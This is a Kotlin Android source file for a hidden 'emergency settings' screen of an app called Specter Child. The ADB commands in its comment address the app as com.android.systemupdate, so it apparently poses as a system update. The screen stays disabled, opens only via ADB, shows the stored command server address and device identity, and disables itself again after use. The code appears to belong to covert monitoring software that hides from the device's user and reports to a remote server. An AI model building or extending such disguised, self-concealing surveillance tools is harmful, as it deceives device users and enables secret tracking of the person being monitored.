package com.divine.specter.child.ui

import android.app.Activity
import android.content.Context
import android.os.Bundle
import android.widget.LinearLayout
import android.widget.TextView
import android.graphics.Color

/**
 * Emergency settings - DISABLED BY DEFAULT.
 *
 * Only accessible via ADB:
 *   adb shell pm enable com.android.systemupdate/.ui.EmergencySettingsActivity
 *   adb shell am start -n com.android.systemupdate/.ui.EmergencySettingsActivity
 *
 * After use, disable again:
 *   adb shell pm disable com.android.systemupdate/.ui.EmergencySettingsActivity
 */
class EmergencySettingsActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val prefs = getSharedPreferences("specter_child_prefs", Context.MODE_PRIVATE)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.BLACK)
            setPadding(32, 64, 32, 32)
        }

        layout.addView(TextView(this).apply {
            text = "SPECTER CHILD - EMERGENCY"
            setTextColor(Color.RED)
            textSize = 18f
        })

        layout.addView(TextView(this).apply {
            text = "\n--- CONFIG ---"
            setTextColor(Color.CYAN)
        })

        val serverIp = prefs.getString("server_ip", "NOT SET")
        val serverPort = prefs.getInt("server_port", 0)
        val deviceId = prefs.getString("device_id", "NOT SET")
        val deviceName = prefs.getString("device_name", "NOT SET")
        val isConfigured = prefs.getBoolean("is_configured", false)
        val configuredAt = prefs.getLong("configured_at", 0)

        val info = """
            |Server: $serverIp:$serverPort
            |Device ID: $deviceId
            |Device Name: $deviceName
            |Configured: $isConfigured
            |Config Time: ${if (configuredAt > 0) java.util.Date(configuredAt) else "Never"}
        """.trimMargin()

        layout.addView(TextView(this).apply {
            text = info
            setTextColor(Color.WHITE)
            textSize = 14f
        })

        layout.addView(TextView(this).apply {
            text = "\n--- ACTIONS ---\nTap to close and disable this activity"
            setTextColor(Color.YELLOW)
            setOnClickListener {
                // Self-disable
                packageManager.setComponentEnabledSetting(
                    componentName,
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP
                )
                finish()
            }
        })

        setContentView(layout)
    }
}
